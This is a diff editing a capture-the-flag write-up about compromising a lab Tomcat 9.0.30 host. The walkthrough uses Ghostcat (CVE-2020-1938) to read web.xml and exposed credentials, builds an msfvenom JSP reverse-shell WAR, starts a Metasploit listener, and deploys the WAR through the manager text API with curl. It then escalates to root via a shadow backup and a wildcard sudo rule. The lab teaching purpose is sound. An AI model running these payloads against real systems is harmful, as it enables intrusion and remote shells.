@@ -32,42 +32,17 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Three ports, and two of them tell a story on their own:
+Three ports, and one of them is a protocol that was never meant to be public.
 
-- **8080** is **Apache Tomcat 9.0.30**, with the default Tomcat landing page.
-- **8009** is **AJP13** — the Apache JServ Protocol.
+## The Connector on 8009
 
-The version is the first thing worth writing down: **9.0.30 is one release before 9.0.31**, and 9.0.31 is where the AJP hardening for **CVE-2020-1938** (Ghostcat) landed. So the connector on this box is inside the vulnerable window.
+**8080** is **Apache Tomcat 9.0.30**, showing the default landing page. **8009** is the **AJP13** connector — the binary protocol Tomcat uses to receive requests from a front-end web server, not from clients. Here there is no front-end at all: no **80**, no **443**. The connector is simply exposed to the network.
 
-## AJP Is Not HTTP
-
-AJP exists so a front-end web server (usually Apache httpd) can hand requests to Tomcat in a compact binary format. It is not meant to be reachable by clients: the whole protocol is built on the assumption that the thing talking to it is a **trusted proxy** sitting in front of the container.
-
-Here there is no front-end at all — no **80**, no **443**. The connector is simply open to the network. And when a protocol trusts its peer that completely, being the peer is the whole game.
-
-That trust shows up in a very concrete place. The AJP **Forward Request** message carries the client address inside the packet, and Tomcat copies those fields straight into the request object. Nothing compares them against the real TCP peer:
-
-```
-java/org/apache/coyote/ajp/AjpProcessor.java  (Tomcat 9.0.30)
-  630:  requestHeaderMessage.getBytes(request.remoteAddr());
-  631:  requestHeaderMessage.getBytes(request.remoteHost());
-```
-
-And the valve that decides who may reach the admin apps reads exactly that value:
-
-```
-RemoteAddrValve.invoke():  property = request.getRequest().getRemoteAddr();
-```
-
-So whoever speaks AJP picks their own source address. I poked the connector with **AJPFuzzer** first to get a feel for it — the tool takes the address fields as plain arguments, which is a fairly loud hint about how much of the message is client-controlled:
-
-```sh
-java -jar ajpfuzzer_v0.7.jar connect vulnnet.thm 8009 genericfuzz 2 "HTTP/1.1" "/" "127.0.0.1" "127.0.0.1" "127.0.0.1" 8009 false
-```
+The version is what makes that interesting. **9.0.30 is one release before 9.0.31**, and 9.0.31 is where the fix for **CVE-2020-1938** — Ghostcat — landed. Ghostcat does two things: it reads files inside a deployed web application, and it can make the container process one of those files as a JSP. The first half is all I needed.
 
 ## Reading the App's Own Paperwork
 
-Ghostcat gives two things: reading files inside a deployed web application, and having the container process one of those files as a JSP. For the first half I went with the **Metasploit** module, which keeps the whole thing to a single command line and drops the loot in `~/.msf4/loot/`:
+For that read I went with the **Metasploit** module — it keeps the whole thing to a single command line and drops the loot in `~/.msf4/loot/`:
 
 ```sh
 msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat;set rhosts vulnnet.thm;set filename /WEB-INF/web.xml;run"
@@ -85,22 +60,11 @@ Three sentences worth more than the XML around them:
 - **"GUI access is disabled for security reasons"**
 - and the general vibe of a company that writes its passwords into application metadata
 
-## Trying the GUI Anyway
-
-My first move with a credential is always to try it somewhere. Even when a note says an access method is disabled, that's a statement about intent — not a fact about the system. So I went straight at the **manager** over HTTP.
-
-![Browser asking for Basic auth against the Tomcat manager](/assets/img/post/thm_vulnnetdotjar/1.png)
-
-The login was accepted, and then Tomcat answered **403**. Which is the interesting part, because in Tomcat "no access to the manager" can mean two completely different things:
-
-- the **origin** is not allowed — the stock `manager` and `host-manager` apps ship a `RemoteAddrValve` that only accepts `127.0.0.1` and `::1`
-- the **account lacks the role** — the manager exposes four different interfaces, each with its own role (`manager-gui` for the HTML GUI, `manager-script` for the text API, `manager-status`, and `admin-gui` for the host-manager)
-
-Here it was the second one. And the phrasing in that 403 page is worth reading slowly: **the text and JMX interfaces are not the GUI**. "GUI access is disabled" describes a role, and roles come in fours. The account could not have the HTML interface — but Tomcat's own documentation tells you not to give a user both `manager-gui` and `manager-script` at once, because the GUI is CSRF-protected and the text API is not. A developer account is exactly the one that ends up with the script interface.
-
 ## Deploying the WAR Without the GUI
 
-The **text API** is meant for tooling, takes plain HTTP, and has no CSRF token to negotiate. Its `deploy` endpoint accepts a WAR upload directly by `PUT`:
+That line in the descriptor — **"GUI access is disabled for security reasons"** — is the answer to the next step. In Tomcat the GUI is just one interface among four: the account has no access to the HTML manager, so I didn't need it. The **text interface** does the same job, is meant for tooling, and speaks plain HTTP — `curl` is enough.
+
+Its `deploy` endpoint accepts a WAR upload directly by `PUT`, so the whole step comes down to three commands: build the payload, get a handler listening, and push the file.
 
 ```sh
 msfvenom -p java/jsp_shell_reverse_tcp lhost=tun0 lport=4444 -f war -o shell.war
@@ -110,7 +74,7 @@ msfconsole -q -x "use multi/handler;set payload java/jsp_shell_reverse_tcp;set l
 curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war "http://vulnnet.thm:8080/manager/text/deploy?path=/shell"
 ```
 
-This is the step that is easy to misread as an **upload vulnerability**. It isn't one. The manager's job is to install applications, and an installed application *is* code that the container will run. Deploying a WAR is remote code execution performed by design — the permission is the security control, and the control walked out of the door with the credentials. Two of the typos on the way there are still in my history, which is how real runs look.
+This is the step that is easy to misread as an **upload vulnerability**. It isn't one. The manager's job is to install applications, and an installed application *is* code that the container will run. Deploying a WAR is remote code execution performed by design — the permission is the security control, and the control walked out of the door with the credentials.
 
 The WAR contains a JSP, so as soon as the context is up, requesting the app executes it with the privileges of the **Tomcat user**:
 
@@ -205,8 +169,8 @@ Root. The user flag was waiting in `web`'s home, and the root flag in `/root` �
 
 ## Lessons Learned
 
-This machine is a story about **metadata and defaults**. The credentials were not stolen or cracked on the way in — they were published, by the deployer, in the application's own descriptor, right next to the line that told me which interface they were for. The connector on **8009** shipped enabled on every interface, and it treats its peer as a trusted proxy: a client speaking AJP declares its own source address, and every host-based trust decision downstream believes it. Then a **backup of `/etc/shadow`** sat in a world-readable directory, and one weak local password turned a shell as `web` into `jdk-admin` — who had root with a wildcard pointing at a file type *I* can produce.
+This machine is a story about **metadata and defaults**. The credentials were published, by the deployer, in the application's own descriptor — right next to the line that told me which interface they were for. The connector on **8009** shipped exposed, and the file read it allowed was enough to walk away with those credentials. A **backup of `/etc/shadow`** sat in a world-readable directory and handed over a local password, and that account had root with a wildcard pointing at a file type *I* can produce.
 
-The reusable version: read the service fingerprint as a version window, read configuration files as human documents, and remember that "this interface is disabled" is a description of a role, not of a system. Roles come in fours, and permissions with a wildcard are permissions you can write into.
+The reusable version: read the service fingerprint as a version window, read configuration files as human documents, and take a hint about an interface as a hint about the **next** interface to use. A wildcard in a `sudo` rule is a permission you can write into.
 
 Hack on!
